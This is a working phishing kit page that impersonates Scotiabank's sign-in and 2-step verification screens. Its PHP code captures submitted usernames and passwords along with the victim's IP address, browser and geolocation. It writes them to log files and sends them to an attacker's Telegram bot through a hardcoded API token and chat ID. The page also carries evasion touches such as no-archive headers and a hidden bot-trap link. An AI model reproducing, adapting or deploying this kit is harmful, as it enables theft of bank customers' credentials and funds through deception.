<?php


$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
        '/windows nt 10/i'      =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
        '/msie/i'      => 'Internet Explorer',
        '/firefox/i'   => 'Firefox',
        '/safari/i'    => 'Safari',
        '/chrome/i'    => 'Chrome',
        '/edge/i'      => 'Edge',
        '/opera/i'     => 'Opera',
        '/netscape/i'  => 'Netscape',
        '/maxthon/i'   => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i'    => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "" . $PublicIP;
$uaget      = "" . $user_agent;
$bsr        = "" . $user_browser;
$uos        = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version   = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "SCOTIA";
    $url        = "https://SCOTIA.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $lh     = "|";
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "" . $full_date;
 
    $li     = ":";
} else {
    $status     = "Status : " . $success;
    fwrite($fp, $status . "\n");
    fwrite($fp, $uaget . "\n");
    fclose($fp);
}



$message = "[BIBLE TALK][NEW INCOMING MESSAGE]\n\n$bank$lh$ip\n\n\[-----------------]\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
file_put_contents($file, "$message[//////////////////////////////////[1-<3-J35U4-EDITION]//////////////////////////////////]\n", FILE_APPEND);
file_put_contents($file2, "$date$li$time$li$ip$li$bsr$li$uos$li$country$li$city$li$continent$li$tp$li$cn$li$is$li$la$li$lp$li$crn$li$type$li$bank$li$url$li$mapurl$li$isp$li$user$li$pass$li\n", FILE_APPEND);
file_put_contents($file1, "$user$li$pass\n", FILE_APPEND);
$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s";
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
    http_build_query($data));


?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<link type="text/css" rel="stylesheet" id="#">
<link type="text/css" rel="stylesheet" id="#">
<style lang="en" type="text/css" id=#"></style>
<style lang="en" type="text/css" id="#"></style>
<style lang="en" type="text/css" id=""></style>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


    <meta name="theme-color" content="#ed0722">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1">
    <title>Auth | Scotiabank</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
    <!--<base href="/recovery/">-->
    <!--<base href=".">-->
    <base href=".">
    <link rel="stylesheet" href="./files/finish.css">
    <link href="./files/styles.52548c4754293a7f0b9b.css" rel="stylesheet" media="all" onload="if(media!=&#39;all&#39;)media=&#39;all&#39;">
    </style>
</head>

<body>
    <div class="root" id="root">
        <div class="_3kP9WPMSj7H53EVe3ptDv6" id="app-layout">
            <header class="_1ChzP-ZqsmzLyF7NCGdiJx" id="header">
                <div class="PoYv4mtPAteIiTCL2kgMd">
                    <a class="link link__text _3NvqcuqzV8Fp_FM2z3Sp4J" href="https://www.scotiabank.com/ca/en/personal.html">
                        <svg class="svg-icon svg-icon-logo--size-18px" focusable="false" role="img" aria-hidden="false" aria-label="Scotiabank Logo" viewBox="0 0 698 104">
                            <g id="scotiabank-red" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="Scotiabank" fill="#EC111A" fill-rule="nonzero">
                                    <path d="M170.01,31.19 C156.062323,31.1859554 143.485962,39.585255 138.146549,52.4704552 C132.807135,65.3556554 135.756462,80.1885427 145.61896,90.0510404 C155.481457,99.9135381 170.314345,102.862865 183.199545,97.5234514 C196.084745,92.1840378 204.484045,79.6076774 204.48,65.66 C204.463459,46.6296004 189.0404,31.206541 170.01,31.19 Z M170.01,80.86 C161.615272,80.86 154.81,74.0547282 154.81,65.66 C154.81,57.2652718 161.615272,50.46 170.01,50.46 C178.404728,50.46 185.21,57.2652718 185.21,65.66 C185.198982,74.0501602 178.40016,80.848982 170.01,80.86 L170.01,80.86 Z" id="Shape"></path>
                                    <polygon id="Path" points="248.41 32.83 239 32.83 239 12.48 218.39 12.48 218.39 32.83 208.98 32.83 208.98 51.48 218.39 51.48 218.39 98.5 239 98.5 239 51.48 248.41 51.48"></polygon>
                                    <rect id="Rectangle" x="257.86" y="32.83" width="20.6" height="65.67"></rect>
                                    <path d="M268.16,1 C261.819771,1 256.68,6.13977107 256.68,12.48 C256.68,18.8202289 261.819771,23.96 268.16,23.96 C274.500229,23.96 279.64,18.8202289 279.64,12.48 C279.634486,6.14205631 274.497944,1.00551366 268.16,1 L268.16,1 Z" id="Path"></path>
                                    <path d="M563.69,50.52 C570.46749,50.5310114 575.958989,56.0225096 575.97,62.8 L575.97,98.5 L596.58,98.5 L596.58,59.97 C596.58,42.48 586.48,31.19 570.58,31.19 C564.03,31.19 557.12,34.05 551.44,43.19 L551.44,32.82 L530.82,32.82 L530.82,98.5 L551.43,98.5 L551.43,62.8 C551.43549,56.0280225 556.91804,50.5365282 563.69,50.52 L563.69,50.52 Z" id="Path"></path>
                                    <polygon id="Path" points="671.69 98.5 646.37 65.69 669.91 32.83 645.82 32.83 626.9 59.4 626.9 2.64 606.3 2.64 606.3 98.5 626.9 98.5 626.9 71.43 647.68 98.5"></polygon>
                                    <path d="M64.59,80.82 C66.1237207,76.9760744 66.8455172,72.8563871 66.71,68.72 C66.71,62.1 64.63,56.17 60.85,52.04 C56.45,47.22 48.93,43.22 38.5,40.15 C36.4899977,39.577524 34.5301415,38.8417418 32.64,37.95 C30.9935723,37.1531986 29.5138959,36.0502288 28.28,34.7 C26.9705108,33.2474071 26.2939302,31.332828 26.4,29.38 C26.4,26.38 28.04,24.26 30.69,22.59 C34.02,20.49 40.43,20.28 46.98,22.71 C49.2881098,23.5549587 51.5140574,24.6093549 53.63,25.86 L62.39,8.43 C58.4888938,5.9483423 54.2571977,4.02943479 49.82,2.73 C45.248444,1.54260553 40.5432276,0.94773174 35.82,0.96 C31.3696885,0.898890768 26.9440177,1.63029467 22.75,3.12 C19.010124,4.5948635 15.6082207,6.81290443 12.75,9.64 C9.89789938,12.5061279 7.6352453,15.9035064 6.09,19.64 C4.5802852,23.5068265 3.83321533,27.6292939 3.89,31.78 C4.13712932,38.3663393 6.91698886,44.6031118 11.65,49.19 C17.65,54.82 24.46,56.81 27.2,57.87 C29.94,58.93 32.95,59.82 34.88,60.59 C36.8618628,61.3317163 38.7538061,62.2944605 40.52,63.46 C41.7860866,64.302037 42.8181978,65.4511207 43.52,66.8 C44.1301295,68.1065747 44.3522644,69.5608639 44.16,70.99 C43.9497756,73.1867465 42.9002544,75.2177311 41.23,76.66 C39.47,78.32 36.28,79.27 31.76,79.27 C27.7791432,79.1550053 23.865945,78.2116146 20.27,76.5 C17.0506856,75.0582424 13.9305086,73.4046154 10.93,71.55 L0.63,89.5 C7.82,95.88 19.47,100.14 29.85,100.14 C35.1255742,100.143992 40.3680451,99.3068174 45.38,97.66 C49.6810835,96.2306452 53.6717284,93.9977844 57.14,91.08 C60.3193526,88.2238861 62.8583051,84.7272884 64.59,80.82 L64.59,80.82 Z" id="Path"></path>
                                    <path d="M686.2,75.54 C681.555866,75.5359546 677.366773,78.3304005 675.586736,82.6198607 C673.806699,86.9093209 674.786409,91.8487129 678.068878,95.1340436 C681.351347,98.4193744 686.289883,99.4033887 690.580893,97.6270904 C694.871903,95.850792 697.669998,91.6641362 697.67,87.02 C697.670002,80.6836743 692.536323,75.5455194 686.2,75.54 L686.2,75.54 Z M686.2,96.19 C682.490174,96.1940456 679.143391,93.9624137 677.720898,90.5361417 C676.298405,87.1098698 677.080481,83.1640502 679.702294,80.5393747 C682.324108,77.9146992 686.269071,77.1283183 689.696893,78.5470722 C693.124715,79.965826 695.359998,83.3101717 695.36,87.02 C695.360003,92.0805485 691.260545,96.1844814 686.2,96.19 L686.2,96.19 Z" id="Shape"></path>
                                    <path d="M686.17,88.94 L684.34,88.94 L684.34,93.29 L682.07,93.29 L682.07,80.73 L686.88,80.73 C689.179128,80.7299934 691.044487,82.5908788 691.05,84.89 C691.017529,86.4724269 690.074959,87.8940717 688.63,88.54 L691.27,93.27 L688.56,93.27 L686.17,88.94 Z M684.34,86.83 L686.97,86.83 C687.974037,86.757398 688.751526,85.9216581 688.751526,84.915 C688.751526,83.9083419 687.974037,83.072602 686.97,83 L684.34,83 L684.34,86.83 Z" id="Shape"></path>
                                    <path d="M121.02,75.18 C116.986142,80.2182875 110.210321,82.1597331 104.120397,80.0221676 C98.0304738,77.884602 93.9545038,72.1341734 93.9545038,65.68 C93.9545038,59.2258266 98.0304738,53.475398 104.120397,51.3378324 C110.210321,49.2002669 116.986142,51.1417125 121.02,56.18 L134.68,42.52 C128.157336,35.3280979 118.899202,31.2274963 109.19,31.23 C90.19,31.23 73.63,44.76 73.63,65.7 C73.63,86.64 90.18,100.18 109.19,100.18 C118.901541,100.183703 128.161372,96.0787172 134.68,88.88 L121.02,75.18 Z" id="Path"></path>
                                    <path d="M359.07,98.5 L359.07,32.82 L338.98,32.82 L338.98,39.73 L337.12,38.07 C332.450803,33.6401596 326.256203,31.1766422 319.82,31.19 C302.09,31.19 287.12,46.97 287.12,65.66 C287.12,84.35 302.12,100.14 319.82,100.14 C326.25542,100.149253 332.448553,97.6863197 337.12,93.26 L338.98,91.59 L338.98,98.5 L359.07,98.5 Z M323.07,81.17 C314.505367,81.164478 307.566321,74.2179712 307.570001,65.6533376 C307.573682,57.0887041 314.518697,50.1481641 323.083331,50.1500036 C331.647965,50.1518431 338.589998,57.0953657 338.59,65.66 C338.584705,69.7822852 336.940681,73.7333333 334.020161,76.6425989 C331.099641,79.5518645 327.142275,81.180621 323.02,81.17 L323.07,81.17 Z" id="Shape"></path>
                                    <path d="M520.94,98.5 L520.94,32.82 L500.82,32.82 L500.82,39.73 L498.96,38.07 C494.290803,33.6401596 488.096203,31.1766422 481.66,31.19 C463.93,31.19 448.95,46.97 448.95,65.66 C448.95,84.35 463.95,100.14 481.66,100.14 C488.09542,100.149253 494.288553,97.6863197 498.96,93.26 L500.82,91.59 L500.82,98.5 L520.94,98.5 Z M484.94,81.17 C476.375367,81.164478 469.436321,74.2179712 469.440001,65.6533376 C469.443682,57.0887041 476.388697,50.1481641 484.953331,50.1500036 C493.517965,50.1518431 500.459998,57.0953657 500.46,65.66 C500.454705,69.7822852 498.810681,73.7333333 495.890161,76.6425989 C492.969641,79.5518645 489.012275,81.180621 484.89,81.17 L484.94,81.17 Z" id="Shape"></path>
                                    <path d="M389.82,98.5 L389.82,91.59 L391.68,93.26 C396.352568,97.6845639 402.54497,100.147207 408.98,100.14 C426.71,100.14 441.69,84.35 441.69,65.66 C441.69,46.97 426.69,31.19 408.98,31.19 C402.543993,31.1776697 396.34976,33.6410409 391.68,38.07 L389.82,39.73 L389.82,2.64 L369.73,2.64 L369.73,98.5 L389.82,98.5 Z M390.27,65.66 C390.270028,57.0992768 397.205981,50.1573976 405.766701,50.1500573 C414.327421,50.1427169 421.275268,57.0726915 421.289977,65.6334021 C421.304686,74.1941127 414.380695,81.1479221 405.82,81.17 C401.701187,81.1753077 397.748961,79.5442042 394.83277,76.6355142 C391.916579,73.7268243 390.275301,69.7788131 390.27,65.66 L390.27,65.66 Z" id="Shape"></path>
                                </g>
                            </g>
                        </svg>
                    </a>
                </div>
            </header>
            <style>
                .sdiv {
                    padding: 0px 10px;
                }

                .sdiv ol {
                    padding-left: 35px;
                    margin: 20px 0px;
                }
            </style>
            <main class="_2ZVb38DpkqtGp0Be4LNKoB">
                <div class="_2Fmffc2ChdxSI8mbU7bwh_">
                    <div class="Card__container Card__container--xs-padding-18 Card__container--sm-padding-24 Card__container--md-padding-30 Card__container--lg-padding-36 _1dzrLUbharfWi1F3nyVifP">
                        <div class="_1AR6e5iqu8uXHMTFKLnqWr">
                            <img src="./files/otp.svg" alt="">
                            <h1 class="TextHeading__text _3hjDHBxiP1Z2Uj2D22Khad">We just sent you a notification</h1>
                        </div>
                        <div class="_3TUAGJx20DmKxOfnE5n6r4 sdiv">
                            <p class="TextBodystyle__Text-canvas-core__xx5i8s-0 cArHA-D TextBody__text" color="black" type="1">To finish signing in to your account:</p>
                            <ol class="Liststyle__List-canvas-core__lwrmec-0 euwklb List__list _1rfEcSWc9g7EoTnOUiUh-_" size="16">
                                <li class="Liststyle__ListItem-canvas-core__lwrmec-1 feYTkT ListItem__item _102rYiYOH65JcBj3dTEF_N">
                                    <span class="TextBodystyle__Text-canvas-core__xx5i8s-0 iivJJS TextBody__text" color="black" type="2">Tap the <strong>notification</strong> on the device you used to set up 2-step verification</span>
                                </li>
                                <li class="Liststyle__ListItem-canvas-core__lwrmec-1 feYTkT ListItem__item _102rYiYOH65JcBj3dTEF_N">
                                    <span class="TextBodystyle__Text-canvas-core__xx5i8s-0 iivJJS TextBody__text" color="black" type="2">Select <strong>Yes, it's me</strong> to confirm your identity</span>
                                </li>
                            </ol>
                            <p class="TextBodystyle__Text-canvas-core__xx5i8s-0 cArHA-D TextBody__text" color="black" type="1">Having trouble? <a size="18" type="emphasis" id="troubleshootingTips" class="Linkstyle__Wrapper-canvas-core__nzeldc-0 dFnMaB Link__link _2QpceqxICtMcchIEPky-E5"><span class="Linkstyle__Text-canvas-core__nzeldc-1 hoiIfz Link__text" type="emphasis">Check out our tips</span></a> to make sure your notifications are set up properly.</p>
                        </div>
                    </div>
                </div>
            </main>
            <footer class="footer footer--light-theme _3Ip9Jf7J6eOEvKAl2ldIr8">
                <div class="footer__bar container container--center direction--row _1t5tVchF8n-Sj-oAlYARZB">
                    <ul class="footer__list">
                        <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/contact-us.html" target="_blank" class="footer__link text--footer text--bold">Contact Us</a></li>
                        <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/security.html" target="_blank" class="footer__link text--footer text--bold">Security</a></li>
                        <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/legal.html" target="_blank" class="footer__link text--footer text--bold">Legal</a></li>
                        <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/about/contact-us/privacy.html" target="_blank" class="footer__link text--footer text--bold">Privacy</a></li>
                        <li class="footer-list__item"><a href="https://www.scotiabank.com/ca/en/personal/accessibility.html" target="_blank" class="footer__link text--footer text--bold">Accessibility</a></li>
                        <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                    </ul>
                    <p class="text--roman text--footer footer__copyright">© Scotiabank. All Rights Reserved.</p>
                </div>
            </footer>
        </div>
    </div>


    <div id="automa-palette"></div>
</body>

</html>
